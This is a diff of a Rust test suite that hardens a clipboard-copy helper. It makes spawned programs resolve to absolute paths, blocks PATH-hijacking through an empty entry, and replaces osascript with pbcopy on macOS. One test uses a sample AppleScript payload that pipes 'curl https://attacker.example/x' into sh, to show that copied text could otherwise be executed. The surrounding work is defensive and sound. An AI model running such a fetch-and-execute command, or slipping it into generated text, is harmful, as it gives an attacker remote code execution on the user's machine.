@@ -148,44 +148,81 @@ async fn views_external_system_editor_treats_an_empty_file_as_no_change() {
 // The clipboard ladder
 // ---------------------------------------------------------------------------
 
-fn nothing(_: &str) -> bool {
-    false
+/// A directory no host has, so a ladder expectation is recognisable in a failure message
+/// and cannot collide with a program the machine running the suite really installed.
+const RESOLVED_DIRECTORY: &str = "/zuno-test-bin";
+
+/// Where the doubles below claim `program` is, joined the way production joins it so the
+/// expectation and the code under test agree about this host's separator.
+fn resolved(program: &str) -> PathBuf {
+    Path::new(RESOLVED_DIRECTORY).join(program)
 }
 
-fn everything(_: &str) -> bool {
-    true
+/// The `argv[0]` an arm must carry once `program` resolves — a path, never the name.
+fn resolved_argv0(program: &str) -> String {
+    resolved(program).display().to_string()
+}
+
+fn nothing(_: &str) -> Option<PathBuf> {
+    None
+}
+
+fn everything(program: &str) -> Option<PathBuf> {
+    Some(resolved(program))
+}
+
+/// A host where `installed` is the only program that resolves.
+///
+/// A resolver rather than a name comparison, so a preference-order test states which file
+/// it expects instead of only which name the ladder asked about.
+fn only(installed: &'static str) -> impl Fn(&str) -> Option<PathBuf> {
+    move |program| (program == installed).then(|| resolved(program))
 }
 
 #[test]
-fn views_external_copy_command_ladder_matches_the_oracle() {
+fn views_external_copy_command_ladder_picks_one_program_per_host() {
     assert_eq!(
         copy_command(Platform::Macos, false, everything),
-        Some(vec![String::from("osascript")])
+        Some(vec![resolved_argv0("pbcopy")]),
+        "macOS must copy through the program that reads stdin as clipboard data"
     );
     assert_eq!(
         copy_command(Platform::Linux, true, everything),
-        Some(vec![String::from("wl-copy")]),
+        Some(vec![resolved_argv0("wl-copy")]),
         "Wayland must be preferred when a Wayland display is present"
     );
     assert_eq!(
         copy_command(Platform::Linux, false, everything),
         Some(vec![
-            String::from("xclip"),
+            resolved_argv0("xclip"),
             String::from("-selection"),
             String::from("clipboard"),
         ]),
         "xclip must come before xsel"
     );
     assert_eq!(
-        copy_command(Platform::Linux, false, |name| name == "xsel"),
+        copy_command(Platform::Linux, false, only("xsel")),
         Some(vec![
-            String::from("xsel"),
+            resolved_argv0("xsel"),
             String::from("--clipboard"),
             String::from("--input"),
         ])
     );
     let windows = copy_command(Platform::Windows, false, everything).expect("powershell");
-    assert_eq!(windows[0], "powershell.exe");
+    assert_eq!(
+        windows[0],
+        resolved_argv0("powershell.exe"),
+        "Windows named the interpreter instead of the file the probe proved"
+    );
+    assert_eq!(
+        windows[1..4],
+        [
+            String::from("-NonInteractive"),
+            String::from("-NoProfile"),
+            String::from("-Command"),
+        ],
+        "the PowerShell fallback lost the flags that keep it non-interactive"
+    );
     assert!(
         windows.last().expect("a script").contains("Set-Clipboard"),
         "the PowerShell fallback lost its script"
@@ -207,12 +244,29 @@ fn views_external_copy_command_is_none_when_nothing_is_installed() {
 fn views_external_copy_command_falls_through_wayland_without_wl_copy() {
     // A Wayland session with only xclip installed still has to copy.
     assert_eq!(
-        copy_command(Platform::Linux, true, |name| name == "xclip"),
+        copy_command(Platform::Linux, true, only("xclip")),
         Some(vec![
-            String::from("xclip"),
+            resolved_argv0("xclip"),
             String::from("-selection"),
             String::from("clipboard"),
         ])
+    );
+}
+
+#[test]
+fn views_external_copy_command_refuses_macos_without_pbcopy() {
+    // The payload is the child's stdin, so `osascript` — which reads its script from
+    // stdin when given no script file — would run a transcript message instead of
+    // copying it. No native fallback is the correct answer for such a host; the write
+    // path still reports that, and OSC 52 remains.
+    assert_eq!(
+        copy_command(Platform::Macos, false, only("osascript")),
+        None,
+        "macOS reached for an interpreter that would execute the copied text"
+    );
+    assert_eq!(
+        copy_command(Platform::Macos, false, only("pbcopy")),
+        Some(vec![resolved_argv0("pbcopy")])
     );
 }
 
@@ -221,7 +275,7 @@ fn views_external_image_read_command_covers_the_two_expressible_arms() {
     assert_eq!(
         image_read_command(Platform::Linux, true, everything),
         Some(vec![
-            String::from("wl-paste"),
+            resolved_argv0("wl-paste"),
             String::from("-t"),
             String::from("image/png"),
         ])
@@ -427,8 +481,9 @@ fn views_external_system_clipboard_native_only_host_still_copies() {
 
     assert_eq!(
         log.entries(),
-        vec![String::from(
-            "run:xclip -selection clipboard:native payload"
+        vec![format!(
+            "run:{} -selection clipboard:native payload",
+            resolved_argv0("xclip")
         )],
         "the native-only host did not feed the payload to its helper"
     );
@@ -537,6 +592,30 @@ fn views_external_environment_resolution_picks_the_wayland_arm_and_the_wrapper()
 }
 
 #[test]
+fn views_external_macos_native_fallback_hands_the_payload_over_as_data() {
+    // A model can write anything into a message the user then copies, and this text is
+    // valid AppleScript that shells out. The macOS fallback must deliver it to a program
+    // that treats stdin as clipboard bytes; delivering it to `osascript` would execute
+    // it, because that is how `osascript` with no script file reads its program.
+    let payload = r#"do shell script "curl https://attacker.example/x | sh""#;
+    let log = CopyLog::shared();
+    SystemClipboard::new(
+        None,
+        false,
+        copy_command(Platform::Macos, false, everything),
+        Box::new(ScriptedRunner::new(Arc::clone(&log))),
+    )
+    .write(payload)
+    .expect("the native fallback delivered it");
+
+    assert_eq!(
+        log.entries(),
+        vec![format!("run:{}:{payload}", resolved_argv0("pbcopy"))],
+        "the copied text did not reach pbcopy as its stdin payload"
+    );
+}
+
+#[test]
 fn views_external_a_redirected_stdout_has_no_osc52_destination() {
     // Not a test accommodation: an escape sequence written to a pipe corrupts that
     // stream instead of reaching a terminal. It is also what keeps the suite quiet —
@@ -580,6 +659,253 @@ fn views_external_path_candidates_join_every_entry_with_the_platform_separator()
 }
 
 #[test]
+fn views_external_is_resolved_program_accepts_only_an_existing_absolute_file() {
+    let directory = tempfile::tempdir().expect("clipboard probe fixture");
+    let helper = directory.path().join("wl-copy");
+    std::fs::write(&helper, b"#!/bin/sh\nexec cat >/dev/null\n").expect("plant the helper");
+
+    assert!(is_resolved_program(&helper));
+    assert!(
+        !is_resolved_program(Path::new("wl-copy")),
+        "a bare name is resolved by the spawn rather than by the probe, which is the \
+         disagreement this predicate exists to prevent"
+    );
+    assert!(
+        !is_resolved_program(&Path::new("real-bin").join("wl-copy")),
+        "a relative candidate is resolved against whatever cwd the spawn happens to have"
+    );
+    assert!(
+        !is_resolved_program(directory.path()),
+        "a directory is not a program"
+    );
+    assert!(
+        !is_resolved_program(&directory.path().join("absent")),
+        "an absolute path to nothing is not an installed helper"
+    );
+}
+
+/// One run, kept element by element.
+///
+/// [`ScriptedRunner`] renders argv into a single log line, which is what the ordering
+/// tests want and exactly what an `argv[0]` assertion must not rest on: the property
+/// under test is which *file* the spawn opens, and a joined string cannot distinguish a
+/// path from a name that merely occurs inside one.
+#[derive(Debug, Default)]
+struct CapturedRun {
+    argv: Mutex<Option<Vec<String>>>,
+    input: Mutex<Option<String>>,
+}
+
+impl CapturedRun {
+    fn shared() -> Arc<Self> {
+        Arc::new(Self::default())
+    }
+
+    fn argv(&self) -> Vec<String> {
+        locked(&self.argv)
+            .clone()
+            .expect("the native fallback was never reached")
+    }
+
+    fn input(&self) -> Option<String> {
+        locked(&self.input).clone()
+    }
+}
+
+struct CapturingRunner(Arc<CapturedRun>);
+
+impl CommandRunner for CapturingRunner {
+    fn run(&self, argv: &[String], input: &str) -> Result<(), ExternalError> {
+        *locked(&self.0.argv) = Some(argv.to_vec());
+        *locked(&self.0.input) = Some(input.to_owned());
+        Ok(())
+    }
+}
+
+/// The arm of the copy ladder this host can prove end to end.
+///
+/// [`SystemClipboard::for_environment`] is bound to the host twice over: [`path_candidates`]
+/// splits `PATH` with the separator of the [`Platform`] it is handed, and
+/// [`is_resolved_program`] asks the host filesystem whether the joined candidate is an
+/// absolute file. A fixture that builds `PATH` from a real temporary directory therefore
+/// has to hand the probe the host's own platform and plant the helper that platform's
+/// ladder asks for. Driving the Linux ladder on a Windows host does not fail for want of
+/// an executable — the probe is `is_file`, which is extension-blind on every platform, and
+/// the runner under these tests captures the argv instead of spawning it — it fails
+/// because `C:\Users\...\real-bin` splits on its drive-letter colon into `C` and
+/// `\Users\...\real-bin`, and `C\xclip` is relative while `\Users\...\real-bin\xclip` has
+/// a root but no prefix, so neither is absolute. Every Unix host reads the Linux ladder's
+/// `PATH` and its paths the way Linux does, so there the Linux arms stand in unchanged.
+struct HostArm {
+    platform: Platform,
+    /// What [`path_candidates`] splits `PATH` on for `platform`.
+    separator: char,
+    /// The program the arm asks `PATH` for, under exactly that name.
+    helper: &'static str,
+    /// The `wayland` flag `for_environment` computes from the environment under test.
+    wayland: bool,
+}
+
+impl HostArm {
+    /// The arm reached with `WAYLAND_DISPLAY` unset.
+    #[cfg(not(windows))]
+    const WITHOUT_WAYLAND: Self = Self {
+        platform: Platform::Linux,
+        separator: ':',
+        helper: "xclip",
+        wayland: false,
+    };
+
+    /// The arm reached with `WAYLAND_DISPLAY` set.
+    #[cfg(not(windows))]
+    const WITH_WAYLAND: Self = Self {
+        platform: Platform::Linux,
+        separator: ':',
+        helper: "wl-copy",
+        wayland: true,
+    };
+
+    /// Windows has one arm whatever the display variables say, so both fixtures reach
+    /// PowerShell; the flag still records what the environment under test implies.
+    #[cfg(windows)]
+    const WITHOUT_WAYLAND: Self = Self {
+        platform: Platform::Windows,
+        separator: ';',
+        helper: "powershell.exe",
+        wayland: false,
+    };
+
+    /// See [`Self::WITHOUT_WAYLAND`].
+    #[cfg(windows)]
+    const WITH_WAYLAND: Self = Self {
+        platform: Platform::Windows,
+        separator: ';',
+        helper: "powershell.exe",
+        wayland: true,
+    };
+
+    /// Plants the helper in `directory` and returns the path the probe has to prove.
+    ///
+    /// The body is never run — the probe is `is_file`, and the runner under these tests
+    /// captures the argv — so it says so instead of pretending to be a program. That also
+    /// keeps the fixture honest on Windows, where the arm asks for `powershell.exe` by
+    /// its full name and the probe appends no `PATHEXT` extension to anything.
+    fn plant(&self, directory: &Path) -> PathBuf {
+        let helper = directory.join(self.helper);
+        std::fs::write(
+            &helper,
+            b"the clipboard probe checks that this file exists; nothing runs it\n",
+        )
+        .expect("plant the helper");
+        helper
+    }
+
+    /// The argv the arm builds once the probe proves `helper`: the ladder's own answer for
+    /// exactly that file, so the fixture does not restate the PowerShell script and the
+    /// property under test stays which *file* reaches the spawn.
+    fn argv_for(&self, helper: &Path) -> Vec<String> {
+        copy_command(self.platform, self.wayland, |program| {
+            (program == self.helper).then(|| helper.to_path_buf())
+        })
+        .expect("the arm resolves its helper")
+    }
+}
+
+#[test]
+fn views_external_the_probe_hands_the_spawn_the_file_it_proved() {
+    // The decided path must be the used path. `for_environment` proves one candidate is a
+    // file, and that candidate — absolute, inside the directory the probe walked — is what
+    // reaches the runner. A bare name would be resolved a second time by the spawn, from a
+    // list the probe never consulted.
+    let arm = HostArm::WITHOUT_WAYLAND;
+    let directory = tempfile::tempdir().expect("clipboard probe fixture");
+    let installed = directory.path().join("real-bin");
+    std::fs::create_dir(&installed).expect("create the PATH directory");
+    let helper = arm.plant(&installed);
+
+    let captured = CapturedRun::shared();
+    // No sink: a flushed OSC 52 write would end the operation, and the native spawn is
+    // what is under test.
+    SystemClipboard::for_environment(
+        arm.platform,
+        |name| (name == "PATH").then(|| installed.display().to_string()),
+        None,
+        Box::new(CapturingRunner(Arc::clone(&captured))),
+    )
+    .write("transcript text")
+    .expect("the planted helper is the fallback");
+
+    let argv = captured.argv();
+    assert_eq!(
+        argv.first(),
+        Some(&helper.display().to_string()),
+        "the spawn did not name the file the probe approved"
+    );
+    assert!(
+        Path::new(&argv[0]).is_absolute(),
+        "argv[0] is still something the spawn would have to search for: {}",
+        argv[0]
+    );
+    assert_eq!(
+        argv,
+        arm.argv_for(&helper),
+        "the arm's arguments did not follow the proved file"
+    );
+    assert_eq!(
+        captured.input(),
+        Some(String::from("transcript text")),
+        "the payload did not reach the helper's stdin"
+    );
+}
+
+#[test]
+fn views_external_an_empty_path_entry_cannot_redirect_the_spawn() {
+    // The attack shape, verbatim: `PATH=":<real>"`. POSIX reads the leading empty
+    // component as the current directory, so for a bare name `execvp` would run a
+    // `wl-copy` that a cloned repository, a dependency's build output or an earlier tool
+    // call left in the workspace — while the probe, which ignores that component, had
+    // approved the real one. That child's stdin is the transcript the user copied, so the
+    // two halves have to agree, and the only answer they may agree on is the real
+    // directory. The fixture spells the shape with the host's separator — `;<real>` on
+    // Windows — so the probe under test walks one empty component and one real one.
+    let arm = HostArm::WITH_WAYLAND;
+    let directory = tempfile::tempdir().expect("clipboard probe fixture");
+    let real = directory.path().join("real");
+    std::fs::create_dir(&real).expect("create the real PATH directory");
+    arm.plant(&real);
+    let path = format!("{}{}", arm.separator, real.display());
+
+    let captured = CapturedRun::shared();
+    SystemClipboard::for_environment(
+        arm.platform,
+        |name| match name {
+            "PATH" => Some(path.clone()),
+            "WAYLAND_DISPLAY" => Some(String::from("wayland-0")),
+            _ => None,
+        },
+        None,
+        Box::new(CapturingRunner(Arc::clone(&captured))),
+    )
+    .write("payload a model wrote")
+    .expect("the real helper is the fallback");
+
+    // One list, walked once: the empty component is not on it, and the argv is the entry
+    // that is.
+    let searched = path_candidates(arm.helper, &path, arm.platform);
+    assert_eq!(
+        searched,
+        vec![real.join(arm.helper)],
+        "the empty PATH component became a candidate"
+    );
+    assert_eq!(
+        captured.argv(),
+        arm.argv_for(&searched[0]),
+        "the spawn was left free to resolve `{}` against the current directory",
+        arm.helper
+    );
+}
+
+#[test]
 fn views_external_child_process_runner_rejects_an_empty_command() {
     // The one arm of the real runner reachable without spawning anything.
     let error = ChildProcessRunner
@@ -588,6 +914,21 @@ fn views_external_child_process_runner_rejects_an_empty_command() {
     assert!(
         error.to_string().contains("empty"),
         "the empty command was not named: {error}"
+    );
+}
+
+#[test]
+fn views_external_child_process_runner_refuses_a_name_it_would_have_to_search_for() {
+    // The spawning half's own refusal, so the invariant does not depend on every future
+    // caller remembering it. `Command::new("wl-copy")` would search for the name, which
+    // is the resolution the probe has already done — and this fails before anything is
+    // spawned, whatever this machine has on its PATH or beside its cwd.
+    let error = ChildProcessRunner
+        .run(&[String::from("wl-copy")], "x")
+        .expect_err("a bare name is not a resolved path");
+    assert!(
+        error.to_string().contains("absolute path"),
+        "the refusal does not say what was wrong with the command: {error}"
     );
 }
 
